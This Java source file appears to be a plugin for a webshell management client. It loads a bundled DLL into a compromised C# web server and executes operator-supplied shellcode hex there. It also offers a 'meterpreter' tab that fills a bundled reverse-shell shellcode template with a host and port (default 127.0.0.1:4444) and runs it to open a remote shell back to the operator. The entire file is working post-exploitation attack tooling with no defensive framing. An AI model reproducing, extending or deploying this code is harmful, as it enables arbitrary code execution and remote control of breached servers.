package vip.youwe.shell.shells.plugins.csharp;


import vip.youwe.shell.core.Encoding;
import vip.youwe.shell.core.annotation.PluginnAnnotation;
import vip.youwe.shell.core.imp.Payload;
import vip.youwe.shell.core.imp.Plugin;
import vip.youwe.shell.core.shell.ShellEntity;
import vip.youwe.shell.core.ui.component.RTextArea;
import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.automaticBindClick;
import vip.youwe.shell.utils.functions;
import vip.youwe.shell.utils.http.ReqParameter;

import javax.swing.*;
import javax.swing.border.TitledBorder;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.io.InputStream;

@PluginnAnnotation(payloadName = "CShapDynamicPayload", Name = "ShellcodeLoader")
public class ShellcodeLoader implements Plugin {

    private static final String CLASS_NAME = "ShellcodeLoader.Run";
    private JPanel panel;
    private JButton loadButton;
    private JButton runButton;
    private JSplitPane splitPane;
    private JSplitPane meterpreterSplitPane;
    private RTextArea shellcodeTextArea;
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;
    private JPanel shellcodeLoaderPanel;
    private JPanel meterpreterPanel;
    private JTabbedPane tabbedPane;
    private RTextArea tipTextArea;
    private JButton goButton;
    private JLabel hostLabel;
    private JLabel portLabel;
    private JTextField hostTextField;
    private JTextField portTextField;
    private JCheckBox is64CheckBox;

    public ShellcodeLoader() {
        this.panel = new JPanel(new BorderLayout());
        this.shellcodeLoaderPanel = new JPanel(new BorderLayout());
        this.meterpreterPanel = new JPanel(new BorderLayout());

        this.hostLabel = new JLabel("host :");
        this.portLabel = new JLabel("port :");
        this.is64CheckBox = new JCheckBox("is64", true);
        this.loadButton = new JButton("Load");
        this.runButton = new JButton("Run");
        this.goButton = new JButton("Go");
        this.shellcodeTextArea = new RTextArea();
        this.meterpreterSplitPane = new JSplitPane();
        this.tipTextArea = new RTextArea();
        this.hostTextField = new JTextField("127.0.0.1", 15);
        this.portTextField = new JTextField("4444", 7);
        this.splitPane = new JSplitPane();
        this.tabbedPane = new JTabbedPane();

        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        this.meterpreterSplitPane.setOrientation(0);
        this.meterpreterSplitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.loadButton);
        topPanel.add(this.runButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.shellcodeTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            public void componentResized(ComponentEvent e) {
                ShellcodeLoader.this.splitPane.setDividerLocation(0.15D);
            }
        });
        this.is64CheckBox.addItemListener(new ItemListener() {
            public void itemStateChanged(ItemEvent e) {
                ShellcodeLoader.this.updateMeterpreterTip();
            }
        });
        this.shellcodeTextArea.setAutoscrolls(true);
        this.shellcodeTextArea.setBorder(new TitledBorder("shellcode"));
        this.shellcodeTextArea.setText("");
        this.tipTextArea.setAutoscrolls(true);
        this.tipTextArea.setBorder(new TitledBorder("tip"));
        this.tipTextArea.setText("");
        this.shellcodeLoaderPanel.add(this.splitPane);

        JPanel meterpreterTopPanel = new JPanel();
        meterpreterTopPanel.add(this.hostLabel);
        meterpreterTopPanel.add(this.hostTextField);
        meterpreterTopPanel.add(this.portLabel);
        meterpreterTopPanel.add(this.portTextField);
        meterpreterTopPanel.add(this.is64CheckBox);
        meterpreterTopPanel.add(this.goButton);
        this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
        this.meterpreterSplitPane.setBottomComponent(new JScrollPane(this.tipTextArea));
        this.meterpreterPanel.add(this.meterpreterSplitPane);
        this.tabbedPane.addTab("shellcodeLoader", this.shellcodeLoaderPanel);
        this.tabbedPane.addTab("meterpreter", this.meterpreterPanel);

        updateMeterpreterTip();
        this.panel.add(this.tabbedPane);
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/ShellcodeLoader.dll");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    JOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
                } else {
                    JOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
                }
            } catch (Exception e) {
                Log.error(e);
                JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
            }
        } else {
            JOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
        }
    }

    private void runButtonClick(ActionEvent actionEvent) {
        String shellcodeHex = this.shellcodeTextArea.getText().trim();
        if (shellcodeHex.length() > 0) {
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("shellcodeHex", shellcodeHex);
            byte[] result = this.payload.evalFunc(CLASS_NAME, "run", reqParameter);
            String resultString = this.encoding.Decoding(result);
            Log.log(resultString);
            JOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
        }
    }

    private void goButtonClick(ActionEvent actionEvent) {
        try {
            String host = this.hostTextField.getText().trim();
            int port = Integer.parseInt(this.portTextField.getText());
            boolean is64 = this.is64CheckBox.isSelected();
            String shellcodeHexString = getMeterpreterShellcodeHex(host, port, is64);
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("shellcodeHex", shellcodeHexString);
            byte[] result = this.payload.evalFunc(CLASS_NAME, "run", reqParameter);
            String resultString = this.encoding.Decoding(result);
            Log.log(resultString);
            JOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
        } catch (Exception e) {
            JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
        }
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }

    public String getMeterpreterShellcodeHex(String host, int port, boolean is64) {
        String shellcodeHex = new String();
        try {
            InputStream inputStream = getClass().getResourceAsStream(String.format("assets/reverse%s.bin", new Object[]{is64 ? "64" : ""}));
            shellcodeHex = new String(functions.readInputStream(inputStream));
            inputStream.close();
            shellcodeHex = shellcodeHex.replace("{host}", functions.byteArrayToHex(functions.ipToByteArray(host)));
            shellcodeHex = shellcodeHex.replace("{port}", functions.byteArrayToHex(functions.shortToByteArray((short) port)));
        } catch (Exception e) {
            Log.error(e);
        }
        return shellcodeHex;
    }

    private void updateMeterpreterTip() {
        try {
            boolean is64 = this.is64CheckBox.isSelected();
            InputStream inputStream = getClass().getResourceAsStream("assets/meterpreterTip.txt");
            String tipString = new String(functions.readInputStream(inputStream));
            inputStream.close();
            tipString = tipString.replace("{arch}", is64 ? "/x64" : "");
            this.tipTextArea.setText(tipString);
        } catch (Exception e) {
            Log.error(e);
        }
    }
}
